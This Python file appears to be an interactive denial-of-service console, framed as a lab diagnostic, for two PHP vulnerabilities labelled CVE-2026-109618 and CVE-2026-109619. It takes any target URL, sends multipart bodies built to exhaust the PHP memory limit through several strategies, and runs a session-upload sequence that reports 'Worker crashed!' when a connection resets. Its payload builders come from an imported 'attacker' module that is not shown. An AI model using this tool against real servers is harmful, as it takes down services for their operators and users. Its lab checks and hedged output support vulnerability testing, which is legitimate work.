#!/usr/bin/env python3
"""Interactive diagnostic console for the PHP CVE-2026-109618/109619 lab."""

import json
import shlex
import sys
from http.cookies import SimpleCookie

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        pass

from attacker import (
    BOUNDARY, parse_target, endpoint_path, send, lab_health, php_post_max_bytes,
    php_size_bytes,
    multipart_part_headers, multipart_empty_files, multipart_form_value,
    multipart_files_registration,
)
from session_progress_probe import (
    multipart_producer, multipart_consumer,
    request as session_request, session_file_state,
)


def human_size(n):
    for unit in ('B', 'KiB', 'MiB', 'GiB'):
        if abs(n) < 1024:
            return f"{n:.0f} {unit}" if n == int(n) else f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} TiB"


BANNER = r"""
  ____  _   _ ____                _ ____       ____
 |  _ \| | | |  _ \      _   _ _(_)  _ \  ___/ ___|
 | |_) | |_| | |_) |____| | | | '_ \| | |/ _ \\___ \
 |  __/|  _  |  __/_____|_|_| | | | | |_| (_) |___) |
 |_|   |_| |_|_|        \__,_|_| |_|____/ \___/|____/

  PHP CVE-2026-109618 / CVE-2026-109619  DoS Console

  target <url>        Set target (e.g. target 192.168.1.10:8088)
  health              Health check
  109618 [strategy]   Multipart parser OOM probe
  109619              Experimental backtrace -> early INI probe
  session             Session lifecycle probe (A->B full sequence)
  set                 Show settable parameters
  show                Show current config
  help                Full help
"""

HELP = """
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Probe CVE-2026-109618 multipart OOM
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Experimental fatal-backtrace -> early INI path
  session                     Probe CVE-2026-109619 session A->B path
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
"""

SET_HELP = """
Settable parameters (payload sizes are explicit; check effective endpoint limits):
  health <path>               Health endpoint (default: oom/health.php)
  upload <path>               Upload endpoint (default: oom/upload.php)
  producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
  consumer <path>             Early consumer endpoint (default: early/health.php)
  seed <path>                 Session seed endpoint (default: session/session-seed.php)
  session-health <path>       Session health endpoint (default: session/health.php)
  session-upload <path>       Session upload endpoint (default: session/upload.php)
  part-headers <n>            Part header count (default: 150000)
  empty-files <n>             Empty file count (conditional experiment)
  field-bytes <n>             Form value / session padding size (default: 6 MiB)
  timeout <seconds>           Request timeout (default: 60)
  expected-php <version>      Expected PHP version (default: 8.5.11)
"""


class Console:
    def __init__(self):
        self.target = None
        self.scheme = self.host = self.port = self.prefix = None
        self.endpoints = {
            "health": "oom/health.php",
            "upload": "oom/upload.php",
            "producer": "fatal-backtrace.php",
            "consumer": "early/health.php",
            "seed": "session/session-seed.php",
            "session-health": "session/health.php",
            "session-upload": "session/upload.php",
        }
        self.target_mem_limit = None
        self.target_post_max = None
        self.part_headers = 653_000
        self.empty_files = 500
        self.field_bytes = 6 * 1024 * 1024
        self.pad_kib = 1340
        self.field_name_kib = 700
        self.timeout = 60.0
        self.expected_php = "8.5.11"

    def path(self, name):
        return endpoint_path(self.prefix, self.endpoints[name])

    def run(self):
        print(BANNER)
        if len(sys.argv) > 1:
            self.cmd_target(sys.argv[1])
        while True:
            try:
                line = input("\033[1;31mDoS>\033[0m ").strip().lstrip("﻿")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            parts = shlex.split(line)
            cmd = parts[0].lower()
            args = parts[1:]
            handler = {
                "target": self.cmd_target,
                "show": lambda *_: self.cmd_show(),
                "health": lambda *_: self.cmd_health(),
                "109618": self.cmd_109618,
                "109619": lambda *_: self.cmd_109619(),
                "session": lambda *_: self.cmd_session(),
                "set": self.cmd_set,
                "help": lambda *_: print(HELP),
                "exit": lambda *_: sys.exit(0),
                "quit": lambda *_: sys.exit(0),
            }.get(cmd)
            if handler is None:
                print(f"Unknown command: {cmd}. Type 'help' for commands.")
                continue
            try:
                handler(*args)
            except Exception as exc:
                print(f"\033[91mError: {exc}\033[0m")

    def _detect_mem_limit(self, body_prefix):
        try:
            data = json.loads(body_prefix)
        except (json.JSONDecodeError, ValueError, TypeError):
            return
        mem_str = data.get("memory_limit")
        post_str = data.get("post_max_size")
        self.target_mem_limit = php_size_bytes(mem_str)
        self.target_post_max = php_size_bytes(post_str)

    def _lab_get(self, name, request_id, *, upload_progress=False):
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path(name), self.timeout, None, request_id)
        data, failure = lab_health(result, self.expected_php, "apache2handler")
        if not failure and upload_progress and str(data.get("upload_progress")) not in ("1", "On"):
            failure = "session upload_progress is disabled"
        if failure:
            print(f"  Preflight failed ({name}): {failure}; {result.get('transport_error', '')}")
            return None, result
        self._detect_mem_limit(result.get("body_prefix", ""))
        return data, result

    @staticmethod
    def _body_fits(body, endpoint_data):
        if "post_max_size" not in endpoint_data:
            print("  Preflight failed: endpoint did not report post_max_size")
            return False
        try:
            post_max = php_post_max_bytes(endpoint_data["post_max_size"])
        except ValueError as exc:
            print(f"  Preflight failed: {exc}")
            return False
        if post_max is not None and len(body) >= post_max:
            print(f"  Preflight failed: body {len(body)} bytes reaches post_max_size {post_max} bytes")
            return False
        return True

    @staticmethod
    def _report_transport_and_pid(result, before_pid):
        if "transport_error" in result:
            print(f"  Transport anomaly: {result['transport_error']}")
        else:
            print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')} ms)")
        after_pid = result.get("worker_pid_header")
        if before_pid and after_pid and before_pid != after_pid:
            print(f"  PID changed {before_pid} -> {after_pid}; cause requires server log/dump")
        elif before_pid and before_pid == after_pid:
            print(f"  Same PID observed: {before_pid}")

    def require_target(self):
        if self.target is None:
            raise RuntimeError("No target set. Use: target <url>")

    def cmd_target(self, url=None):
        if url is None:
            if self.target:
                print(f"Current target: {self.target}")
            else:
                print("No target set. Usage: target <url>")
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        self.scheme, self.host, self.port, self.prefix = parse_target(url)
        self.target = url
        self.target_mem_limit = None
        self.target_post_max = None
        print(f"\033[92mTarget set: {self.scheme}://{self.host}:{self.port}{self.prefix}\033[0m")

    def cmd_show(self):
        print(f"  target:        {self.target or '(not set)'}")
        mem = human_size(self.target_mem_limit) if self.target_mem_limit else "(unknown)"
        post = human_size(self.target_post_max) if self.target_post_max else "(unknown)"
        print(f"  memory_limit:  {mem}")
        print(f"  post_max_size: {post}")
        for k, v in self.endpoints.items():
            print(f"  {k:16s} {v}")
        print(f"  part-headers:  {self.part_headers:,}")
        print(f"  empty-files:   {self.empty_files:,}")
        print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
        print(f"  timeout:       {self.timeout}s")
        print(f"  expected-php:  {self.expected_php}")

    def cmd_health(self):
        self.require_target()
        print(f"GET {self.path('health')} ...")
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path("health"), self.timeout, None, "health-check")
        if "transport_error" in result:
            print(f"\033[91m{result['transport_error']}\033[0m")
            return
        print(f"HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
        body_prefix = result.get("body_prefix", "")
        try:
            data = json.loads(body_prefix)
            print(f"  PHP:  {data.get('php')}")
            print(f"  SAPI: {data.get('sapi')}")
            print(f"  PID:  {data.get('pid')}")
            print(f"  Mem:  {data.get('memory_limit')}")
            print(f"  Post: {data.get('post_max_size')}")
            self._detect_mem_limit(body_prefix)
        except json.JSONDecodeError:
            print(f"  Body: {body_prefix[:200]}")

    def cmd_109618(self, strategy=None):
        self.require_target()
        strategy = strategy or "part-headers"
        strategies = {
            "part-headers": lambda: multipart_part_headers(self.part_headers),
            "empty-files": lambda: multipart_empty_files(self.empty_files),
            "form-value": lambda: multipart_form_value(self.field_bytes),
            "files-registration": lambda: multipart_files_registration(
                self.pad_kib * 1024, self.field_name_kib * 1024),
        }
        if strategy not in strategies:
            print(f"Unknown strategy. Choose: {', '.join(strategies)}")
            return
        print(f"[CVE-2026-109618] Multipart parser probe: {strategy}")
        baseline_data, baseline = self._lab_get("health", "109618-baseline")
        if baseline_data is None:
            return
        upload_data, _ = self._lab_get("upload", "109618-upload-preflight")
        if upload_data is None:
            return
        if php_size_bytes(upload_data.get("memory_limit")) is None:
            print("  Preflight failed: finite memory_limit required")
            return
        body = strategies[strategy]()
        if not self._body_fits(body, upload_data):
            return
        print(f"  Sending {human_size(len(body))} multipart body...")
        result = send(self.scheme, self.host, self.port, "POST",
                      self.path("upload"), self.timeout, None, "oom-candidate",
                      body, f"multipart/form-data; boundary={BOUNDARY}")
        self._report_transport_and_pid(result, baseline.get("worker_pid_header"))
        body_text = result.get("body_prefix", "")
        if "Allowed memory size" in body_text:
            print("  PHP memory-limit OOM text observed in response")
        else:
            print("  PHP memory-limit OOM not observed in response")
        print(f"  Response prefix: {body_text[:200]}")
        after = send(self.scheme, self.host, self.port, "GET",
                     self.path("health"), self.timeout, None, "after")
        print("  Follow-up health:")
        self._report_transport_and_pid(after, baseline.get("worker_pid_header"))
        print("  CVE effect needs server-side crash/debug evidence and a patched control")

    def cmd_109619(self):
        self.require_target()
        print("[CVE-2026-109619] Experimental fatal-backtrace -> early INI probe")
        baseline_data, baseline = self._lab_get("health", "109619-baseline")
        if baseline_data is None:
            return
        if str(baseline_data.get("fatal_error_backtraces")) not in ("1", "On"):
            print("  Preflight failed: fatal_error_backtraces is not enabled")
            return
        consumer_data, consumer_control = self._lab_get("consumer", "109619-consumer-control")
        if consumer_data is None:
            return
        if str(consumer_data.get("auto_detect_line_endings")) not in ("1", "On"):
            print("  Preflight failed: early INI diagnostic is not active")
            return
        print("  Sending fatal producer...")
        producer = send(self.scheme, self.host, self.port, "GET",
                        self.path("producer"), self.timeout, None, "fatal-producer")
        self._report_transport_and_pid(producer, consumer_control.get("worker_pid_header"))
        if producer.get("http_status") != 500 or producer.get("lab_producer_header") != "fatal-backtrace":
            print("  Stopping: fatal producer marker/HTTP 500 not observed")
            return
        producer_pid = producer.get("worker_pid_header")
        print("  Sending early consumer...")
        consumer = send(self.scheme, self.host, self.port, "GET",
                        self.path("consumer"), self.timeout, None, "early-consumer")
        self._report_transport_and_pid(consumer, producer_pid)
        consumer_pid = consumer.get("worker_pid_header")
        if producer_pid and consumer_pid:
            print(f"  A/B same worker observed: {producer_pid == consumer_pid}")
        print("  HTTP alone cannot establish stale-state access or a worker crash")

    def cmd_session(self):
        self.require_target()
        print("\033[93m[CVE-2026-109619] Session A→B worker crash\033[0m")
        print("Step 1: Health check...")
        health = send(self.scheme, self.host, self.port, "GET",
                      self.path("session-health"), self.timeout, None, "session-health")
        if "transport_error" in health:
            print(f"  \033[91m{health['transport_error']}\033[0m")
            return
        print(f"  PID: {health.get('worker_pid_header', '?')}, HTTP {health.get('http_status')}")
        producer_body = multipart_producer(self.field_bytes, "candidate",
                                           part_headers=self.part_headers)
        print(f"  Producer body: {human_size(len(producer_body))}")
        print("Step 2: Acquiring session cookie...")
        seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
                                           self.path("seed"), timeout=self.timeout)
        if "transport_error" in seed:
            print(f"  \033[91m{seed['transport_error']}\033[0m")
            return
        try:
            seed_data = json.loads(seed.get("body_prefix", ""))
        except (TypeError, ValueError):
            seed_data = {}
        if not isinstance(seed_data, dict):
            seed_data = {}
        cookies = SimpleCookie()
        if set_cookie:
            cookies.load(set_cookie)
        session_name = seed_data.get("session_name")
        if (seed.get("http_status") != 200 or not seed_data.get("seeded") or
                not session_name or session_name not in cookies):
            print("  \033[91mFailed to get a valid session cookie\033[0m")
            return
        sid = cookies[session_name].value
        cookie = f"{session_name}={sid}"
        pid_before = health.get("worker_pid_header", "?")
        print(f"Step 3: Producer A ({human_size(len(producer_body))} with session progress)...")
        producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=producer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
            return
        body_text = producer.get("body_prefix", "")
        oom_observed = "Allowed memory size" in body_text and "exhausted" in body_text
        if oom_observed:
            print("  \033[93mOOM triggered!\033[0m")
        else:
            print(f"  HTTP {producer.get('http_status')} — no OOM, aborting")
            print(f"  Body: {body_text[:200]}")
            return
        consumer_body = multipart_consumer()
        print("Step 4: Consumer B (session progress callback on stale state)...")
        consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=consumer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in consumer:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
            print("  \033[92mWorker crashed! (connection reset)\033[0m")
        else:
            pid_after = consumer.get("worker_pid_header", "?")
            print(f"  HTTP {consumer.get('http_status')}, PID: {pid_after}")
            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
                print(f"  \033[92mPID changed: {pid_before} → {pid_after}\033[0m")

    def cmd_set(self, key=None, value=None, *_):
        if key is None:
            print(SET_HELP)
            return
        if value is None:
            print(f"Usage: set {key} <value>")
            return
        if key in self.endpoints:
            endpoint_path(self.prefix or "", value)
            self.endpoints[key] = value
            self.target_mem_limit = None
            self.target_post_max = None
            print(f"  {key} = {value}")
        elif key == "part-headers":
            number = int(value)
            if number < 1:
                raise ValueError("part-headers must be >= 1")
            self.part_headers = number
            print(f"  part-headers = {self.part_headers}")
        elif key == "empty-files":
            number = int(value)
            if not 1 <= number <= 10000:
                raise ValueError("empty-files must be 1..10000")
            self.empty_files = number
            print(f"  empty-files = {self.empty_files}")
        elif key == "field-bytes":
            number = int(value)
            if not 1 <= number <= 64 * 1024 * 1024:
                raise ValueError("field-bytes must be 1..67108864")
            self.field_bytes = number
            print(f"  field-bytes = {self.field_bytes}")
        elif key == "timeout":
            number = float(value)
            if not 0.5 <= number <= 60:
                raise ValueError("timeout must be 0.5..60 seconds")
            self.timeout = number
            print(f"  timeout = {self.timeout}s")
        elif key == "expected-php":
            self.expected_php = value
            print(f"  expected-php = {self.expected_php}")
        else:
            print(f"Unknown parameter: {key}")
            print(SET_HELP)


if __name__ == "__main__":
    Console().run()
